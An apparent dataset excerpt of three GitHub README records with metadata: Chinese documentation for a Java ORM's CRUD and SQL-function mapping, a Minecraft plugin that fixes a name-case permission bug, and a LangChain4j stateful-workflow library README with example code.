        department3.setNumber(""103"");
        department3.setName(""fff"");

        List<Department> list = Arrays.asList(department1, department2, department3);

        client.insert(list).executeRows();
    }
}
```

新增任意数据

```java
public class DisplayTest extends BaseTest
{
    public void i3()
    {
        Department d = new Department();

        Department department1 = new Department();
        department1.setNumber(""101"");
        department1.setName(""ddd"");
        Department department2 = new Department();
        department2.setNumber(""102"");
        department2.setName(""eee"");
        Department department3 = new Department();
        department3.setNumber(""103"");
        department3.setName(""fff"");

        List<Department> ds = Arrays.asList(department1, department2, department3);

        client.insert(d).insert(ds).executeRows();
    }
}
```

### 更新

更新由client对象的update方法发起，update方法接收一个class对象，返回一个更新过程对象，
可以对这个对象后续进行`set`设置数据和`where`限制更新范围等操作

| 方法                   | 参数               | 返回       | 说明                       |
|----------------------|------------------|----------|--------------------------|
| left/right/innerJoin | 同查询过程对象的leftJoin | 新的更新过程对象 | 用于连表更新，操作方式与查询时的join方法一致 |
| set                  | lambda表达式        | this     | 设置更新数据的lambda表达式         |
| where                | 同查询过程对象的where    | this     | 同查询过程对象的where            |

> 警告：进行无where限制下的update时默认会报错，需要手开启无视无where限制

为Department表更新数据

```java
public class UpdateTest extends BaseTest
{
    public void display0()
    {
        long l2 = client.update(Department.class)
                .set(s -> s.setName(""newName""))
                .where(w -> w.getNumber() == ""100"")
                .executeRows();
    }
}
```

对应sql

```mysql
UPDATE `departments` AS t0
SET t0.`dept_name` = ?
WHERE t0.`dept_no` = ?
```

连表更新

```java

@SuppressWarnings(""all"")
public class UpdateTest extends BaseTest
{
    long l = client.update(Department.class)
            .leftJoin(DeptEmp.class, (a, b) -> a.getNumber() == b.getDeptNumber())
            .set((a, b) -> a.setName(b.getDeptNumber()))
            .where((a, b) -> 1 == 1)
            .executeRows();
}
```

对应sql

```mysql
UPDATE `departments` AS t0 LEFT JOIN `dept_emp` AS t1 ON t0.`dept_no` = t1.`dept_no`
SET t0.`dept_name` = t1.`dept_no`
WHERE ? = ?
```

### 删除

删除由client对象的delete方法发起，delete方法接收一个class对象，返回一个删除过程对象，
可以对这个对象后续进行`where`限制更新范围等操作

| 方法                   | 参数                      | 返回       | 说明                                                |
|----------------------|-------------------------|----------|---------------------------------------------------|
| left/right/innerJoin | 同查询过程对象的leftJoin        | 新的删除过程对象 | 用于连表删除，操作方式与查询时的join方法一致                          |
| where                | 同查询过程对象的where           | this     | 同查询过程对象的where                                     |
| selectDelete         | 返回需要删除的目标表的对象的lambda表达式 | this     | join后连表删除时可以使用，用于指定需要删除的表，可以通过多次调用增加目标（无调用默认选择全部） |

> 警告：进行无where限制下的delete时默认会报错，需要手开启无视无where限制

为Department表删除数据

```java
public class DeleteTest extends BaseTest
{
    @Test
    public void d1()
    {
        long executeRows = client.delete(Department.class)
                .where(w -> w.getNumber() == ""10009"")
                .executeRows();
    }
}
```

对应sql

```mysql
DELETE
FROM `departments` AS t0
WHERE t0.`dept_no` = ?
```

连表删除

```java
public class DeleteTest extends BaseTest
{
    @Test
    public void d2()
    {
        String sql = client.delete(Department.class)
                .leftJoin(DeptEmp.class, (d, dm) -> d.getNumber() == dm.getDeptNumber())
                .where((d, dm) -> d.getNumber() == ""d009"")
//                .selectDeleteTable((d, dm) -> d)
                .selectDelete((d, dm) -> dm)
                .toSql();
        System.out.println(sql);
    }
}
```

对应sql

```mysql
DELETE t1
FROM `departments` AS t0
         LEFT JOIN `dept_emp` AS t1 ON t0.`dept_no` = t1.`dept_no`
WHERE t0.`dept_no` = ?
```

## 关联查询 INCLUDE

假设我们有一个工资类和一个员工类，员工类配置了对工资类的关联信息，员工与工资是一对多关系（一个员工有多个工资信息）

```java

@Data
@Table(value = ""salaries"")
public class Salary
{
    @Column(value = ""emp_no"", primaryKey = true)
    private int empNumber;
    private int salary;
    @Column(""from_date"")
    private LocalDate from;
    @Column(""to_date"")
    private LocalDate to;
}

@Data
@Table(""employees"")
public class Employee
{
    @Column(value = ""emp_no"", primaryKey = true)
    private int number;
    @Column(""birth_date"")
    private LocalDate birthDay;
    @Column(""first_name"")
    private String firstName;
    @Column(""last_name"")
    private String lastName;
    @Column(converter = GenderConverter.class)
    private Gender gender;
    @Column(""hire_date"")
    private LocalDate hireDay;
    // 一对多，self为自身的number字段，target为Salary的empNumber字段
    @Navigate(value = RelationType.OneToMany, self = ""number"", target = ""empNumber"")
    private List<Salary> salaries;
}
```

现在我们就可以填充指定的员工的工资信息

```java
public class IncludeTest extends BaseTest
{
    @Test
    public void oneManyTest()
    {
        //获取编号为10001的员工并且查询出该员工的所有工资信息
        Employee employee = client.query(Employee.class)
                .where(e -> e.getNumber() == 10001)
                .includes(e -> e.getSalaries())
                .first();

        Assert.assertEquals(17, employee.getSalaries().size());
    }
}
```

我们也可以对这个查询做出限制

```java
public class IncludeTest extends BaseTest
{
    @Test
    public void oneManyCondTest()
    {
        //获取编号为10001的员工并且查询出该员工最后一次调整工资（9999-01-01）以外的历史工资
        Employee employee = client.query(Employee.class)
                .where(e -> e.getNumber() == 10001)
                .includes(e -> e.getSalaries(), s -> s.getTo().isBefore(LocalDate.of(9999, 1, 1)))
                .first();

        Assert.assertEquals(16, employee.getSalaries().size());
    }
}
```

也支持更复杂的限制条件，比方说限制关联查询获取的条目数

```java
public class IncludeTest extends BaseTest
{
    @Test
    public void oneManyCond2Test()
    {
        //获取编号为10001的员工并且查询出该员工最后一次调整工资（9999-01-01）以外的历史工资
        //同时只获取前10条
        //并且按工资排序
        Employee employee = client.query(Employee.class)
                .includesByCond(e -> e.getSalaries(), query -> query
                        .orderBy(s -> s.getSalary())
                        .where(s -> s.getTo().isBefore(LocalDate.of(9999, 1, 1)))
                        .limit(10)
                )
                .first();

        Assert.assertEquals(10, employee.getSalaries().size());
    }
}
```

## 支持的sql函数

框架内部支持了绝大多数的常用sql函数，具体逻辑可以在SqlFunctions类中查看

`时间相关`

| 函数名            | 参数 | 返回类型                    | 功能                   |
|----------------|----|-------------------------|----------------------|
| now            |    | LocalDateTime           | 获取当前的日期时间            |
| utcNow         |    | LocalDateTime           | 获取当前的utc日期时间         |
| systemNow      |    | LocalDateTime           | 获取当前的系统日期时间          |
| nowDate        |    | LocalDate               | 获取当前的日期              |
| nowTime        |    | LocalTime               | 获取当前的时间              |
| utcNowDate     |    | LocalDate               | 获取当前的utc日期           |
| utcNowTime     |    | LocalTime               | 获取当前的utc时间           |
| addData        |    | LocalDate/LocalDateTime | 日期或日期时间增加指定的单位长度     |
| subDate        |    | LocalDate/LocalDateTime | 日期或日期时间减去指定的单位长度     |
| dateTimeDiff   |    | long                    | 获取两个日期或日期时间相差的指定单位的值 |
| dateFormat     |    | String                  | 格式化日期或日期时间           |
| getYear        |    | int                     | 提取年份                 |
| getMonth       |    | int                     | 提取月份                 |
| getWeek        |    | int                     | 提取周                  |
| getDay         |    | int                     | 提取日                  |
| getHour        |    | int                     | 提取小时                 |
| getMinute      |    | int                     | 提取日                  |
| getSecond      |    | int                     | 提取秒                  |
| getMilliSecond |    | int                     | 提取毫秒                 |
| getDayName     |    | String                  | 获取指定日期在本周周几的全名       |
| getDayOfWeek   |    | int                     | 获取指定日期在本周周几          |
| getDayOfYear   |    | int                     | 获取指定日期是当年的第几天        |
| dateToDays     |    | int                     | 从0000-01-01到指定日期的天数  |
| getLastDay     |    | LocalDate               | 获取本月最后一天的日期          |
| getMonthName   |    | String                  | 获取指定日期的月份名称          |
| getQuarter     |    | int                     | 获取指定日期在第几季度          |
| getWeekDay     |    | int                     | 获取指定日期在本周周几的索引       |
| getWeekOfYear  |    | int                     | 获取本周是今年的第几周          |

`数值相关`

| 函数名      | 参数           | 返回类型   | 功能                        |
|----------|--------------|--------|---------------------------|
| abs      |              | 同入参    |                           |
| cos      |              | double |                           |
| acos     |              | double |                           |
| sin      |              | double |                           |
| asin     |              | double |                           |
| tan      |              | double |                           |
| atan     |              | double |                           |
| atan2    |              | double |                           |
| ceil     |              | int    | 向上取整到最近的整数                |
| floor    |              | int    | 向下取整到最近的整数                |
| cot      |              | double | 余切函数                      |
| degrees  |              | double | 弧度转角度                     |
| radians  |              | double | 角度转弧度                     |
| exp      |              | double |                           |
| big      |              | 同入参    | 获取所有数值中最大的数值              |
| small    |              | 同入参    | 获取所有数值中最小的数值              |
| ln       |              | double |                           |
| log      |              | double |                           |
| log2     |              | double |                           |
| log10    |              | double |                           |
| mod      |              | 同入参    | 取模                        |
| pi       |              | double | 获取PI                      |
| pow      |              | double |                           |
| random   |              | double | 获取0-1的随机小数                |
| round    | (T a)        | int    | 四舍五入取整                    |
| round    | (T a, int b) | 同入参    | 指定截取多少位小数四舍五入取整           |
| sign     |              | int    | 参数为正数、负数和零时分别返回 1, -1 和 0 |
| sqrt     |              | double | 获取平方根                     |
| truncate | (T a)        | int    | 截断所有小数位                   |
| truncate | (T a, int b) | double | 截断指定位数的小数位                |

`字符串相关`

| 函数名          | 参数                                         | 返回类型   | 功能                            |
|--------------|--------------------------------------------|--------|-------------------------------|
| strToAscii   |                                            | int    | 第一个字符的ASCII码                  |
| asciiToStr   |                                            | String | ASCII码转字符串                    |
| length       |                                            | int    | 字符串的长度                        |
| byteLength   |                                            | int    | 字符串的字节长度                      |
| concat       |                                            | String | 拼接字符串                         |
| join         |                                            | String | 根据插值拼接字符串                     |
| numberFormat |                                            | String | 格式化数值                         |
| indexOf      | (String str, String subStr)                | int    | 返回一个字符串中指定子字符串的位置             |
| indexOf      | (String str, String subStr, int offset)    | int    | 返回一个字符串中指定子字符串的位置,并且指定起始搜索的位置 |
| toLowerCase  |                                            | String | 转小写                           |
| toUpperCase  |                                            | String | 转大写                           |
| left         |                                            | String | 返回具有指定长度的字符串的左边部分             |
| right        |                                            | String | 返回具有指定长度的字符串的右边部分             |
| leftPad      |                                            | String | 从左边开始对字符串进行重复填充，直到满足指定的长度     |
| rightPad     |                                            | String | 从右边开始对字符串进行重复填充，直到满足指定的长度     |
| trimStart    |                                            | String | 去除字符串左侧的空格                    |
| trimEnd      |                                            | String | 去除字符串右侧的空格                    |
| trim         |                                            | String | 去除字符串左侧和右侧的空格                 |
| replace      |                                            | String | 替换字符串中指定的字符为新字符               |
| reverse      |                                            | String | 反转字符串                         |
| compare      |                                            | int    | 比较字符串                         |
| subString    | (String str, int beginIndex)               | String | 获取子字符串                        |
| subString    | (String str, int beginIndex, int endIndex) | String | 获取子字符串                        |

`其他`

| 函数名       | 参数                                           | 返回类型 | 功能                                                                      |
|-----------|----------------------------------------------|------|-------------------------------------------------------------------------|
| If        | (boolean condition, T truePart, T falsePart) | T    | 如果condition为true则返回truePart，否则返回falsePart                               |
| ifNull    | (T valueNotNull, T valueIsNull)              | T    | 如果valueNotNull为null则返回valueIsNull，否则返回如果valueNotNull为null则返回valueIsNull |
| nullIf    | (T t1, T t2)                                 | T    | 如果t1 = t2则返回null，否则返回t1                                                 |
| cast      | (Object value, Class\<T> targetType)         | T    | 转换到指定类型                                                                 |
| cast      | (Object value, SqlTypes\<T> targetType)      | T    | 转换到指定类型                                                                 |
| isNull    | (T t)                                        | T    | isNull的快捷方法                                                             |
| isNotNull | (T t)                                        | T    | isNotNull的快捷方法                                                          |****

## java函数到sql表达式的映射

> 以下仅列举映射到mysql的情况，实际会根据数据库类型来决定策略

`String类`

| java                                | sql                              |       
|-------------------------------------|----------------------------------|
| this.contains(arg)                  | this LIKE CONCAT('%',arg,'%')    |
| this.startsWith(arg)                | this LIKE CONCAT(arg,'%')        |
| this.endsWith(arg)                  | this LIKE CONCAT('%',arg)        |
| this.length()                       | CHAR_LENGTH(this)                |
| this.toUpperCase()                  | UPPER(this)                      |
| this.toLowerCase()                  | LOWER(this)                      |
| this.concat(arg)                    | CONCAT(this,arg)                 |
| this.trim()                         | TRIM(this)                       |
| this.isEmpty()                      | (CHAR_LENGTH(this) = 0)          |
| this.indexOf(subStr)                | INSTR(this,subStr)               |
| this.indexOf(subStr,fromIndex)      | LOCATE(subStr,this,fromIndex)    |
| this.replace(oldStr,newStr)         | REPLACE(this,oldStr,newStr)      |
| this.substring(beginIndex)          | SUBSTR(this,beginIndex)          |
| this.substring(beginIndex,endIndex) | SUBSTR(this,beginIndex,endIndex) |
| String.join(delimiter,elements...)  | CONCAT_WS(delimiter,elements...) |

`Math类`

| java                | sql              |
|---------------------|------------------|
| Math.abs(arg)       | ABS(arg)         |
| Math.cos(arg)       | COS(arg)         |
| Math.acos(arg)      | ACOS(arg)        |
| Math.sin(arg)       | SIN(arg)         |
| Math.asin(arg)      | ASIN(arg)        |
| Math.tab(arg)       | TAN(arg)         |
| Math.atan(arg)      | ATAN(arg)        |
| Math.atan2(arg)     | ATAN2(arg)       |
| Math.toDegrees(arg) | DEGREES(arg)     |
| Math.toRadians(arg) | RADIANS(arg)     |
| Math.exp(arg)       | EXP(arg)         |
| Math.floor(arg)     | FLOOR(arg)       |
| Math.log(arg)       | LN(arg)          |
| Math.log10(arg)     | LOG10(arg)       |
| Math.random()       | RAND()           |
| Math.round(arg)     | ROUND(arg)       |
| Math.pow(arg1,arg2) | POWER(arg1,arg2) |
| Math.signum(arg)    | SIGN(arg)        |
| Math.sqrt(arg)      | SQRT(arg)        |

`List接口`

| java               | sql             |
|--------------------|-----------------|
| this.contains(arg) | arg IN (this,,) |

`BigDecimal类`

| java                | sql        |
|---------------------|------------|
| this.add(arg)       | this + arg |
| this.subtract(arg)  | this - arg |
| this.multiply(arg)  | this * arg |
| this.divide(arg)    | this / arg |
| this.remainder(arg) | this % arg |

`Temporal接口`

> LocalDate,LocalDateTime,LocalTime

| java               | sql        |
|--------------------|------------|
| this.isAfter(arg)  | this > arg |
| this.isBefore(arg) | this < arg |
| this.isEqual(arg)  | this = arg |
",0,0,1,apache-2.0,0.0,"['mysql', 'oracle', 'sqlserver', 'sqlite', 'pgsql', 'schema', 'string', 'value', 'string', 'primarykey', 'boolean', 'false', 'value', 'string', 'converter', 'class', 'extends', 'iconverter', 'value', 'relationtype', 'self', 'string', 'target', 'string', 'mappingtable', 'class', 'extends', 'imappingtable', 'selfmapping', 'string', 'targetmapping', 'string', 'crud', 'query', 'insert', 'update', 'delete', 'new', 'grouper', 'int', 'string', 'lambda', 'insert', 'executerows', 'set', 'selectdelete', 'include', 'localdatetime', 'utcnow', 'localdatetime', 'systemnow', 'localdatetime', 'nowdate', 'localdate', 'nowtime', 'localtime', 'utcnowdate', 'localdate', 'utcnowtime', 'localtime', 'adddata', 'subdate', 'datetimediff', 'long', 'dateformat', 'string', 'getyear', 'int', 'getmonth', 'int', 'getweek', 'int', 'getday', 'int', 'gethour', 'int', 'getminute', 'int', 'getsecond', 'int', 'getmillisecond', 'int', 'getdayname', 'string', 'getdayofweek', 'int', 'getdayofyear', 'int', 'datetodays', 'int', 'getlastday', 'localdate', 'getmonthname', 'string', 'getquarter', 'int', 'getweekday', 'int', 'getweekofyear', 'int', 'ab', 'co', 'double', 'acos', 'double', 'sin', 'double', 'asin', 'double', 'tan', 'double', 'atan', 'double', 'double', 'ceil', 'int', 'floor', 'int', 'cot', 'double', 'degree', 'double', 'radian', 'double', 'exp', 'double', 'big', 'small', 'ln', 'double', 'log', 'double', 'double', 'double', 'mod', 'pi', 'double', 'pow', 'double', 'random', 'double', 'round', 'int', 'round', 'int', 'b', 'sign', 'int', 'sqrt', 'double', 'truncate', 'int', 'truncate', 'int', 'b', 'double', 'strtoascii', 'int', 'asciitostr', 'string', 'length', 'int', 'bytelength', 'int', 'concat', 'string', 'join', 'string', 'numberformat', 'string', 'indexof', 'string', 'str', 'string', 'substr', 'int', 'indexof', 'string', 'str', 'string', 'substr', 'int', 'offset', 'int', 'tolowercase', 'string', 'touppercase', 'string', 'left', 'string', 'right', 'string', 'leftpad', 'string', 'rightpad', 'string', 'trimstart', 'string', 'trimend', 'string', 'trim', 'string', 'replace', 'string', 'reverse', 'string', 'compare', 'int', 'substring', 'string', 'str', 'int', 'beginindex', 'string', 'substring', 'string', 'str', 'int', 'beginindex', 'int', 'endindex', 'string', 'boolean', 'condition', 'truepart', 'falsepart', 'ifnull', 'valuenotnull', 'valueisnull', 'nullif', 'cast', 'object', 'value', 'class', 'targettype', 'cast', 'object', 'value', 'sqltypes', 'targettype', 'isnull', 'isnotnull', 'java', 'sql', 'arg', 'like', 'concat', 'arg', 'arg', 'like', 'concat', 'arg', 'arg', 'like', 'concat', 'arg', 'upper', 'lower', 'arg', 'concat', 'arg', 'trim', 'substr', 'instr', 'substr', 'substr', 'fromindex', 'locate', 'substr', 'fromindex', 'oldstr', 'newstr', 'replace', 'oldstr', 'newstr', 'beginindex', 'substr', 'beginindex', 'beginindex', 'endindex', 'substr', 'beginindex', 'endindex', 'delimiter', 'element', 'delimiter', 'element', 'java', 'sql', 'arg', 'ab', 'arg', 'arg', 'co', 'arg', 'arg', 'acos', 'arg', 'arg', 'sin', 'arg', 'arg', 'asin', 'arg', 'arg', 'tan', 'arg', 'arg', 'atan', 'arg', 'arg', 'arg', 'arg', 'degree', 'arg', 'arg', 'radians', 'arg', 'arg', 'exp', 'arg', 'arg', 'floor', 'arg', 'arg', 'ln', 'arg', 'arg', 'arg', 'rand', 'arg', 'round', 'arg', 'power', 'arg', 'sign', 'arg', 'arg', 'sqrt', 'arg', 'java', 'sql', 'arg', 'arg', 'java', 'sql', 'arg', 'arg', 'arg', 'arg', 'arg', 'arg', 'arg', 'arg', 'arg', 'arg', 'localdate', 'localdatetime', 'localtime', 'java', 'sql', 'arg', 'arg', 'arg', 'arg', 'arg', 'arg']","['arg', 'string', 'int', 'double', 'substr']",0,0,0,"['database', 'mysql', 'true', 'inject', 'inject', 'inject', 'inject', 'dynamic', 'inject', 'main', 'crud', 'include']",25,"['inject', 'database', 'mysql', 'true', 'dynamic']",36,616.0,12.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,9.0,3.0,41145,87.87878787878788,6.370344827586207,['Maven Central Version -> https://img.shields.io/maven-central/v/io.github.kiryu1223/drink-all'],1
egecanakincioglu/name-fix-plugin,main,"# 💡 CartelNameFix Java Minecraft Plugin

## 🛠️ What Does This Plugin Do?

This plugin is designed to prevent players from exploiting permission or account bugs to disrupt the economic or authority balance of the server. When players join the server with the name ""Cartel,"" this name is recorded in a MySQL database. After being registered, permission matching is done in the tables, associating the name with the permissions of the player. Some plugins, due to certain bugs, mistakenly apply the permissions of the ""Cartel"" account to anyone trying to enter the game with the name ""cartel."" This system solves that issue precisely.

## 🚀 How Does This Plugin Solve the Problem?

The issue arises from various plugins or vulnerabilities in older Minecraft versions. This plugin addresses it by creating an SQL database to control connection requests of players joining the game based on the data in the SQL. If such an account does not exist in the plugin's SQL, it will be created, and default permissions will be assigned to the newly created accounts. Subsequently, if administrators assign you administrative permissions in the game, it will be updated in the database as well. In short, if there's an account named ""Cartel,"" you can no longer create an account with the name ""cartel.""

## 🛠️ What's Needed for Installation?

Currently, it doesn't depend on any other plugin, so it will work by simply placing the CartelNameFix.jar file into the ./plugins directory. However, for clarification:

- Navigate to the ./plugins directory of your server and drag the CartelNameFix.jar file into it.
- Start your server and monitor the console. You'll see informative messages indicating the plugin has been loaded.
- If the plugin loads successfully, it will create a file and an associated database file. All name data for your server will be stored here.
- This way, you'll be free from all name bugs.

For further information, feel free to contact me. You can also support me in future projects by checking out my GitHub profile and reaching out to me through the provided channels.
",0,0,1,apache-2.0,0.0,"['cartelnamefix', 'java', 'minecraft', 'plugin', 'plugin', 'plugin', 'designed', 'prevent', 'player', 'exploiting', 'permission', 'account', 'bug', 'disrupt', 'economic', 'authority', 'balance', 'server', 'player', 'join', 'server', 'name', 'cartel', 'name', 'recorded', 'mysql', 'database', 'registered', 'permission', 'matching', 'done', 'table', 'associating', 'name', 'permission', 'player', 'plugins', 'due', 'certain', 'bug', 'mistakenly', 'apply', 'permission', 'cartel', 'account', 'anyone', 'trying', 'enter', 'game', 'name', 'cartel', 'system', 'solves', 'issue', 'precisely', 'plugin', 'solve', 'problem', 'issue', 'arises', 'various', 'plugins', 'vulnerability', 'older', 'minecraft', 'version', 'plugin', 'address', 'creating', 'sql', 'database', 'control', 'connection', 'request', 'player', 'joining', 'game', 'based', 'data', 'sql', 'account', 'exist', 'plugin', 'sql', 'created', 'default', 'permission', 'assigned', 'newly', 'created', 'account', 'subsequently', 'administrator', 'assign', 'administrative', 'permission', 'game', 'updated', 'database', 'well', 'short', 'account', 'named', 'cartel', 'longer', 'create', 'account', 'name', 'cartel', 'needed', 'installation', 'currently', 'depend', 'plugin', 'work', 'simply', 'placing', 'file', 'directory', 'however', 'clarification', 'navigate', 'directory', 'server', 'drag', 'file', 'start', 'server', 'monitor', 'console', 'see', 'informative', 'message', 'indicating', 'plugin', 'loaded', 'plugin', 'load', 'successfully', 'create', 'file', 'associated', 'database', 'file', 'name', 'data', 'server', 'stored', 'way', 'free', 'name', 'bug', 'information', 'feel', 'free', 'contact', 'also', 'support', 'future', 'project', 'checking', 'github', 'profile', 'reaching', 'provided', 'channel']","['plugin', 'name', 'permission', 'account', 'server']",0,0,0,"['cartelnamefix', 'java', 'minecraft', 'plugin', 'what', 'do', 'this', 'plugin', 'do', 'how', 'doe', 'this', 'plugin', 'solve', 'problem', 'what', 'need', 'installation']",4,"['plugin', 'what', 'do', 'this', 'cartelnamefix']",0,0.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0,2084,15.5,4.844574780058651,[],0
czelabueno/langchain4j-workflow,main,"# LangChain4j Workflow 🦜🔀

Build advanced java applications with AI based on flexible stateful workflows 💡

## Overview
LangChain4j Workflow is a dynamic, stateful workflow engine crafted as a Java library, drawing inspiration from graph network libraries. It empowers developers with granular control over the flow and state of their applications. This engine is a game-changer for building sophisticated AI applications, such as RAG-based approaches using modern paradigms and agent architectures, where the application's flow and state are pivotal. It enables the crafting of custom behavior, leading to a significant reduction in hallucinations and an increase in response reliability

LangChain4j Workflow is influenced by [LangGraph](https://langchain-ai.github.io/langgraph/tutorials/introduction/), [Graphviz](https://graphviz.gitlab.io/Gallery/directed/) and [Apache Beam](https://beam.apache.org/), and it offers a multitude of benefits. It allows you to define custom workflows as a graph, iteratively, with cycles, flexibility, control, and conditional decisions. These benefits are indispensable for building advanced AI applications.

LangChain4j Workflow is designed to integrate seamlessly with [LangChain4j](https://docs.langchain4j.dev/), enabling you to define custom workflows using all the features that LangChain4j offers. This integration could provide a comprehensive toolset for building advanced AI applications.

> 🌟 **Starring me**: If you find this repository beneficial, don't forget to give it a star! 🌟 Your support increases its chances of being merged with the LangChain4j codebase. It's a simple way to show your appreciation and help this project grow!

## Key Features
- **Stateful**: LangChain4j Workflow is a stateful engine, enabling you to design custom states as POJO and transitions. This feature provides a robust foundation for managing the flow and state of your application.
- **Graph-Based**: The workflow is graph-based, offering the flexibility to define custom workflows with multiple directions such as one-way, round trip, cyclic, and more. This feature allows for intricate control over the flow of your application.
- **Flexible**: LangChain4j Workflow is designed with flexibility in mind. You can define custom workflows and append them at any point in other RAG paradigms, such as Modular RAG. This flexibility allows for a high degree of customization.
- **Iterative**: The engine supports the implementation of loops and conditionals in your custom workflows. This feature allows for complex logic and flow control within your workflows.
- **Streaming Support**: LangChain4j Workflow supports streaming outputs as they are produced by each node. This feature allows for real-time processing and response in your application.
- **Integration**: LangChain4j Workflow is designed to integrate seamlessly with [LangChain4j](https://docs.langchain4j.dev/), enabling you to define custom workflows using all the features that LangChain4j offers. This integration provides a comprehensive toolset for building advanced AI applications.
- **Visualization**: The engine supports the generation of workflow images. This feature allows you to visualize the flow computed of your app workflow. By Default it uses `Graphhviz` lib to generate the image, but you implement your own image generator on `GraphImageGenerator.java` interface.

## Installation
```shell
mvn clean package install
```
## Example
In **LangChain4j Workflow**, the notion of state plays a pivotal role. Every execution of the graph initiates a state, which is then transferred among the nodes during their execution. Each node, after its execution, updates this internal state with its own return value. The method by which the graph updates its internal state is determined by user-defined functions.

Add the following dependency to your `pom.xml` file:
```xml
<dependency>
  <groupId>dev.langchain4j</groupId>
  <artifactId>langchain4j-workflow</artifactId>
  <version>0.1.0</version> <!--Change to the latest version-->
</dependency>
```
Define a stateful bean with fields that will be used to store the state of the workflow:
```java
// Define a stateful bean
public class MyStatefulBean {
  int value = 0;
}
```

Create a simple workflow with 4 nodes and conditional edges:
```java
public class Example {
  public static void main(String[] args) {
    
    MyStatefulBean myStatefulBean = new MyStatefulBean();

    // Define functions that determines statefulBean state
    Function<MyStatefulBean, String> node1Func = obj -> {
      obj.value +=1;
      System.out.println(""Node 1: ["" + obj.value + ""]"");
      return ""Node1: function proceed"";
    };
    Function<MyStatefulBean, String> node2Func = obj -> {
      obj.value +=2;
      System.out.println(""Node 2: ["" + obj.value + ""]"");
      return ""Node2: function proceed"";
    };
    Function<MyStatefulBean, String> node3Func = obj -> {
      obj.value +=3;
      System.out.println(""Node 3: ["" + obj.value + ""]"");
      return ""Node3: function proceed"";
    };
    Function<MyStatefulBean, String> node4Func = obj -> {
      obj.value +=4;
      System.out.println(""Node 4: ["" + obj.value + ""]"");
      return ""Node4: function proceed"";
    };

    // Create the nodes and associate them with the functions to be used during execution.
    Node<MyStatefulBean, String> node1 = Node.from(""node1"", node1Func);
    Node<MyStatefulBean, String> node2 = Node.from(""node2"", node2Func);
    Node<MyStatefulBean, String> node3 = Node.from(""node3"", node3Func);
    Node<MyStatefulBean, String> node4 = Node.from(""node4"", node4Func);


    // Create workflow
    StateWorkflow<MyStatefulBean> workflow = DefaultStateWorkflow.<MyStatefulBean>builder() 
            .statefulBean(myStatefulBean)
            .addNodes(Arrays.asList(node1, node2, node3))
            .build();

    // You can add more nodes after workflow build. E.g. node4
    workflow.addNode(node4);

    // Define edges
    workflow.putEdge(node1, node2);
    workflow.putEdge(node2, node3);
    // Conditional edge
    workflow.putEdge(node3, Conditional.eval(obj -> {
      System.out.println(""Stateful Value ["" + obj.value + ""]"");
      if (obj.value > 6) {
        return node4;
      } else {
        return node2;
      }
    }));
    workflow.putEdge(node4, WorkflowStateName.END);

    // Define which node to start
    workflow.startNode(node1);

    // Run workflow normally
    workflow.run();
    // OR
    // Run workflow in streaming mode
    workflow.runStream(node -> {
      System.out.println(""Processing node: "" + node.getName());
    });

    // Print all computed transitions
    String transitions = workflow.prettyTransitions();
    System.out.println(""Transitions: \n"");
    System.out.println(transitions);

    // Generate workflow image
    workflow.generateWorkflowImage(""image/my-workflow.svg"");
    // workflow.generateWorkflowImage(); // if you use this method, it'll use by default the root path and default image name.
  }
}
```
Now you can check the output of the workflow execution.

```shell
STARTING workflow in stream mode..
Processing node: node1
Node 1: [1]
Processing node: node2
Node 2: [3]
Processing node: node3
Node 3: [6]
Stateful Value [6]
Processing node: node2
Node 2: [8]
Processing node: node3
Node 3: [11]
Stateful Value [11]
Processing node: node4
Node 4: [15]
Reached END state
```
You can print all computed transitions:

```shell
START -> node1 -> node2 -> node3 -> node2 -> node3 -> node4 -> END
```
You can generate a workflow image with all computed transitions:

![Workflow Image](image/my-workflow.svg)

## LLM examples
You can check all examples in the [langchain4j-worflow-examples](https://github.com/czelabueno/langchain4j-workflow-examples) repository. Please note that examples can be modified and more examples will be added over time.
### MoA
- **Mixture-of-Agents (MoA)**:
  - Java example: [`langchain4j-moa`](https://github.com/czelabueno/langchain4j-workflow-examples/tree/main/langchain4j-moa)
  - Based on Paper: https://arxiv.org/pdf/2406.04692

### RAG
- **Corrective RAG (CRAG)**:
  - Java example: [`langchain4j-corrective-rag`](https://github.com/czelabueno/langchain4j-workflow-examples/tree/main/langchain4j-corrective-rag)
  - Based on Paper: https://arxiv.org/pdf/2401.15884
- **Adaptive RAG**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2403.14403
- **Self RAG**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2310.11511
- **Modular RAG**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2312.10997v1

### Agent Architectures
- **Multi-agent Collaboration**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2308.08155
- **Agent Supervisor**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2308.08155
- **Planning Agents**:
  - Java example: _Very soon_
  - Based on Paper: https://arxiv.org/pdf/2305.04091

## Contribute & feedback
If you have any feedback, suggestions, or want to contribute, please feel free to open an issue or a pull request. We are open to new ideas and suggestions.
Help us to maturity this project and make it more useful for the community in order to merge it with LangChain4j source code.

## Authors
- Carlos Zela [@c_zela](https://x.com/c_zela)
